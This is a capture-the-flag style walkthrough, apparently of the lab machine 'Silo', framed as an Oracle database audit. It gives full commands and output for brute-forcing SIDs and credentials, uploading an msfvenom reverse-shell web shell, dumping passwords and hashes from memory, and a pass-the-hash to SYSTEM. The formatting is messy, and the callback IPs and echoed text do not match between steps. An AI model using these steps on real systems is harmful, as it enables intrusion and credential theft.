---
title: "How to audit an Oracle database"
seoTitle: "How to audit an Oracle database"
seoDescription: "How to audit an Oracle database"
datePublished: Tue Dec 12 2023 16:45:06 GMT+0000 (Coordinated Universal Time)
cuid: clq2kplwr00040bl7dj4v0pk4
slug: how-to-audit-an-oracle-database
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1702399453982/41713bda-1788-4ae9-8bf4-2ab1f46bce91.jpeg
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1702399496201/d2542535-2d55-480d-82cc-811891ed1a6e.jpeg
tags: oracle, databases, sql, pentesting, cybersecurity-1

---

**With this tutorial you will learn:**  
How to perform a simple port scan with Nmap.  
How to perform a brute force attack to discover an Oracle TNS SID.  
Aprender a utilizar la ODAT - (Oracle Database Attack Tool).  
How to attack an Oracle server with Metasploit Framework.  
How to perform forensic analysis with Volatility.  
How to extract password hashes in a memory dump.  
How to perform a privilege escalation using the pass the hash technique.  
Hacking Silo  
As always, we are going to start listing our victim. To do this, we will perform a simple scan with Nmap, as follows.

```plaintext
╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # nmap -sS -T4 -sV -sC 10.10.10.82
Nmap scan report for 10.10.10.82
Host is up (0.097s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-08-03 12:12:21
|_  start_date: 2018-08-03 11:47:06
```

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 171.99 seconds  
With the result of the previous scan, we could see that this server probably has Windows Server 2008 R2 and on the other hand has port 80 enabled (Microsoft IIS httpd 8.5).  
For this pentesting, we are going to focus on port 1521, which indicates to be an oracle-tns service.

## **Brute force to identify the SID**

To continue, we are going to audit this Oracle database with the ODAT tool.  
ODAT is an open source pentesting tool designed to attack and audit the security of Oracle Database servers.  
The next steps are:

List Oracle Database Version  
Discovery of SIDs (An ID is represented as a unique “database instance”)  
Obtain a user account (Through bruteforcing)  
Exploitation / Escalation of privileges.  
We can use the ODAT\_ follower to find out either:\_

```plaintext
`╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]
╰─[:)] # ./odat.py sidguesser -s 10.10.10.82

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'SAMPLE' is a valid SID. Continue...
[+] 'SCAN4' is a valid SID. Continue...
[+] 'XE' is a valid SID. Continue...
[+] 'XEXDB' is a valid SID. Continue...
100% |##############################################| Time: 00:10:55
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |##############################################| Time: 00:00:12
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'XE' is a valid SID. Continue...
100% |##############################################| Time: 00:07:31
[+] SIDs found on the 10.10.10.82:1521 server: SAMPLE,SCAN4,XE,XEXDB
```

## Brute force to find correct credentials

From the results, we identified 4 possible SIDs (SAMPLE,SCAN4,XE,XEXDB).\`  
Next, we will need to identify valid credentials to authenticate to the database.  
For this task, we can use a metasploit helper module called oracle\_login.

\`  
`msf5 > use admin/oracle/oracle_login   msf5 auxiliary(admin/oracle/oracle_login) > set RHOST 10.10.10.82   RHOST => 10.10.10.82   msf5 auxiliary(admin/oracle/oracle_login) > set SID XE   SID => XE   msf5 auxiliary(admin/oracle/oracle_login) > run -j   [*] Auxiliary module running as background job 0.`

`[] Starting brute force on 10.10.10.82:1521...   [+] Found user/pass of: scott/tiger on 10.10.10.82 with sid XE   [] Auxiliary module execution completed`  
\`

Very good. We found a valid credential.  
Another way to detect valid credentials is to use a list of default credentials.  
Valid credentials mean we can connect to the XE instance and start querying the database for possible information. It turns out that scott also has the SYSBDA privilege . Think of it as something similar to sudo - it gives you extra flexibility and greater privileges in case you want to do any database alterations, user administration, the list goes on.

`Oracle Database Penetration Testing`  
Now that we have a valid SID and credentials, we can connect to the database for manual enumeration.

`   ╭─[/opt/oracle]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # sqlplus scott/`[`tiger@10.10.10.82`](mailto:tiger@10.10.10.82)`:1521/XE`

`SQL*Plus: Release 12.1.0.2.0 Production on Tue Oct 3 12:56:27 2019`

`Copyright (c) 1982, 2014, Oracle. All rights reserved.`

`Connected to:   Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`

`SQL> select * from v$version;`

## BANNER

`Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production   PL/SQL Release 11.2.0.2.0 - Production   CORE 11.2.0.2.0 Production   TNS for 64-bit Windows: Version 11.2.0.2.0 - Production   NLSRTL Version 11.2.0.2.0 - Production   `

`To start, we can check the privileges and roles of the users.`

`SQL> SELECT * FROM user_role_privs;`

\`  
USERNAME GRANTED\_ROLE ADM DEF OS\_

---

SCOTT CONNECT NO YES NO  
SCOTT

```plaintext
   RESOURCE               NO  YES NO
```

\`

As you can see, Scott is a low privileged user on the system. In order to gain access to the shell, we might need to escalate our privilege to DBA first and perform some known attacks on Oracle. To achieve this easily, we can use a tool called ODAT (Oracle Database Attack Tool) . It is an open source tool used to automate attacks on an Oracle database.

Before we can use ODAT, we need to install it in Kali first. You can refer to this installation guide to install it successfully.

## Usando ODAT - (Oracle Database Attack Tool)

Initially, we will run all the ODAT modules on our victim server.

`╭─[/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # python` [`odat.py`](https://nmap.org/submit/) `all -s 10.10.10.82 -d XE -U scott -P tiger`

[`1`](https://10.10.10.82:1521/)`: Is it vulnerable to TNS poisoning (CVE-2012-1675)?   [+] The target is vulnerable to a remote TNS poisoning`

[`2`](https://10.10.10.82:1521/)`: Testing all modules on the XE SID with the scott/tiger account   [2.1] UTL_HTTP library ?   [-] KO   [2.2] HTTPURITYPE library ?   [+] OK   [2.3] UTL_FILE library ?   [-] KO   [2.4] JAVA library ?   [-] KO   [2.5] DBMSADVISOR library ?   [+] OK   [2.6] DBMSSCHEDULER library ?   [-] KO   [2.7] CTXSYS library ?   [-] KO   [2.8] Hashed Oracle passwords ?   [+] OK   [2.9] Hashed Oracle passwords from history?   [-] KO   [2.10] DBMS_XSLPROCESSOR library ?   [+] OK   [2.11] External table to read files ?   [-] KO   [2.12] External table to execute system commands ?   [-] KO   [2.13] Oradbg ?   [-] KO   [2.14] DBMS_LOB to read files ?   [+] OK   [2.15] SMB authentication capture ?   [-] KO   [2.17] Modify any table while/when he can select it only normally (CVE-2014-4237)?   [-] KO   [2.18] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?   [-] KO   `

The DBMS\_XSLPROCESSOR library is enabled and therefore allows us to put any file on the machine.  
First, we'll create a simple text file and check if we can successfully upload it to wwwroot .

`   ╭─[/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # echo "Hacked By Gerh" > File-Test.txt`

`╭─[/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4439]   ╰─[:)] # python` [`odat.py`](https://nmap.org/submit/) `dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile "c:\inetpub\wwwroot" "File-Test.txt" "/tmp/File-Test.txt"`

[`1`](https://10.10.10.82:1521/)`` : Put the /root/Desktop/File-Test.txt local file in the C:\inetpub\wwwroot\ folder like File-Test.txt on the 10.10.10.82 server   [+] The /root/Desktop/File-Test.txt file was created on the C:\inetpub\wwwroot\ directory on the 10.10.10.82 server like the File-Test.txt file` ``

\`  
As you can see, we can upload the file successfully. Let's check using curl .

`   ``╭─[/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # curl http://10.10.10.82/File-Test.txt   Hacked By ferdi``   `

Now that we can load to the target system, we can easily generate a reverse shell with ASPX using msfvenom, load it using ODAT, and activate it to gain access to the shell.

``    ╭─[/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.110 LPORT=443 -f aspx > /tmp/shell.aspx   No platform was selected, choosing Msf::Module::Platform::Windows from the payload   No encoder or badchars specified, outputting raw payload   Payload size: 500 bytes   Final size of aspx file: 3606 bytes` ``

`╭─[/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # python` [`odat.py`](https://nmap.org/submit/) `dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile "c:\\inetpub\\wwwroot" "shell.aspx" "/tmp/shell.aspx"   [1] (10.10.10.82:1521): Put the /tmp/shell.aspx local file in the C:\inetpub\wwwroot\ folder like shell.aspx on the 10.10.10.82 server   [+] The /root/Desktop/shell.aspx file was created on the C:\inetpub\wwwroot\ directory on the 10.10.10.82 server like the shell.aspx file`  
\`

After uploading our shell, we will start the Metasploit framework and configure it to listen on the ports previously indicated.  
Subsequently, we only have to make a request to the route [http://10.10.10.82/shell.aspx](https://nmap.org/submit/) and in a console establish a listener to receive our reverse shell.

`   ╭─[/Ethic4l-Hacking/Operations/Silo/ODAT]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # msfconsole   msf5 exploit(multi/handler) > set LHOST 10.10.14.110   LHOST => 10.10.14.110   msf5 exploit(multi/handler) > set LPORT 443   LPORT => 443   msf5 exploit(multi/handler) > exploit`

`[] Started reverse TCP handler on 10.10.14.110:443   [] Meterpreter session 1 opened (10.10.14.110:443 -> 10.10.10.82:49177) at 2019-10-03 21:43:08`

`Microsoft Windows` [`Version 6.3.9600`](https://dev.toc/) `2013 Microsoft Corporation. All rights reserved.`

`c:\windows\system32\inetsrv> whoami   whoami   iis apppool\defaultapppool   `

Ready, we now have a Shell and with it we can execute commands on the server.

## Privilege Escalation

As you can see, there is a file called “Oracle issue.txt” in the Desktop directory. This could hold a clue to our privilege escalation vector.

`   `C:\\Users\\Phineas\\Desktop&gt; type "Oracle issue.txt"  
type "Oracle issue.txt"  
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link  
[https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0](https://nmap.org/submit/)

link password:  
£%Hm8646uC$\`

`    The text file mentions a core dump. That's a good sign for us, because there is a high probability that that memory dump contains valuable information. Many tools will analyze memory for us and pull out valuable things like passwords. So it's pretty clear that we need to do some memory analysis.   After downloading the zip file, we unzip it and discover that it contains a core dump. We use the volatility tool to investigate the dump.    `

Using Volatility to Extract Passwords  
\`  
After downloading the crash dump, we can use volatility on it to perform forensic analysis. Volatility is built into Kali, so there is no need to do an additional installation. If you're not familiar with Volatility, you can check out this SANS cheat sheet .  
For the initial step, we would need to identify the OS version of the machine where the crash dump was taken so that the volatility plugins are accurate. Although we can simply issue a systeminfo command in our shell session, we can also identify this using a volatility plugin called imageinfo .

``    ╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # volatility -f SILO-20180105-221806.dmp imageinfo   Volatility Foundation Volatility Framework 2.6   Suggested Profile(s) : Win8SP0x64, Win10x64_17134, Win81U1x64, Win10x64_10240_17770, Win2012R2x64_18340, Win10x64_14393, Win10x64, Win2016x64_14393, Win10x64_16299, Win2012R2x64, Win2012x64, Win8SP1x64_18340, Win10x64_10586, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)   AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)   AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)   AS Layer3 : FileAddressSpace (/datos/gerh/Escritorio/Prometheus/Ethic4l-Hacking/Operations/Premium/Silo/SILO-20180105-221806.dmp)   PAE type : No PAE   DTB : 0x1a7000L   KDBG : 0xf80078520a30L   Number of Processors : 2   Image Type (Service Pack) : 0   KPCR for CPU 0 : 0xfffff8007857b000L   KPCR for CPU 1 : 0xffffd000207e8000L   KUSER_SHARED_DATA : 0xfffff78000000000L   Image date and time : 2018-01-05 22:18:07 UTC+0000   Image local date and time : 2018-01-05 22:18:07 +0000` ``

\`  
One of the useful plugins that we can use in this situation is lsadump. The lsadump plugin dumps the decrypted LSA secrets from the registry. This exposes information such as the default password (for systems with autologin enabled), RDP public keys, and credentials used by DPAPI .

`╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 lsadump   Volatility Foundation Volatility Framework 2.6   DefaultPassword   0x00000000 1e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................   0x00000010 44 00 6f 00 4e 00 6f 00 74 00 48 00 40 00 63 00` [`D.o.N.o.t.H.@.c`](mailto:D.o.N.o.t.H.@.c)`.   0x00000020 6b 00 4d 00 65 00 42 00 72 00 6f 00 21 00 00 00 k.M.e.B.r.o.!...`

`` DPAPI_SYSTEM   0x00000000 2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ,...............   0x00000010 01 00 00 00 cf 25 94 31 34 9e ae 43 2d 8b 87 ac .....%.14..C-...   0x00000020 f2 a7 74 1c 6d ec 1c 04 08 43 a8 a6 a9 42 62 f7 ..t.m....C...Bb.   0x00000030 55 70 48 bb 17 7d 82 fe 79 49 02 bd 00 00 00 00 UpH..}..yI......` ``

\`  
As you can see in the lsadump results, we were able to acquire a plaintext password DoNotH@ckMeBro! .  
Since the SMB service is accessible over the network, we can use winexe to log in via SMB.

`   ╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # winexe -U Administrator //10.10.10.82 cmd.exe   Enter password: DoNotH@ckMeBro!`

`Microsoft Windows` [`Version 6.3.9600`](https://dev.toc/) `2013 Microsoft Corporation. All rights reserved.`

`` C:\Windows\system32>whoami   whoami   silo\administrator` ``

\`  
Another way we could have escalated privileges is through the hivelist plugin .

\`

\`

`   ╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist   Volatility Foundation Volatility Framework 2.6   Virtual Physical Name`

---

`0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat   0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS   0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve   0xffffc0000001e000 0x0000000000b65000 [no name]   0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM   0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE   0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD   0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE   0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT   0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY   0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM   0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT   0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI   0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT   0xffffc00000fed000 0x000000000d67f000   \??\C:\Users\Administrator\ntuser.dat   `

Now we can dump the hashes by supplying the addresses related to SYSTEM and SAM.

> Note: To use hashdump, you must specify the virtual address of the SYSTEM column with the -y parameter and the virtual address of the SAM column with the -s parameter.

`    ╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000   Volatility Foundation Volatility Framework 2.6   Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::   Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::   Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::    `

We could try to crack these, but first, let's try the pass the hash attack:

\`  
`╭─[/Ethic4l-Hacking/Operations/Silo]─[root@Arthorias]─[0]─[4438]   ╰─[:)] # /opt/impacket/examples/`[`psexec.py`](https://nmap.org/submit/) `-hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82`[`administrator@10.10.10.82`](mailto:administrator@10.10.10.82)`   Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies`

`[] Requesting shares on 10.10.10.82.....   [] Found writable share ADMIN$   [] Uploading file XryxqKFr.exe   [] Opening SVCManager on 10.10.10.82.....   [] Creating service PAYb on 10.10.10.82.....   [] Starting service PAYb.....   [!] Press help for extra shell commands   Microsoft Windows` [`Version 6.3.9600`](https://dev.toc/) `2013 Microsoft Corporation. All rights reserved.`

`C:\Windows\system32>whoami   nt authority\system   `

don't forget to follow for more thank you very much *Ferdi Birgül*

cyber security expert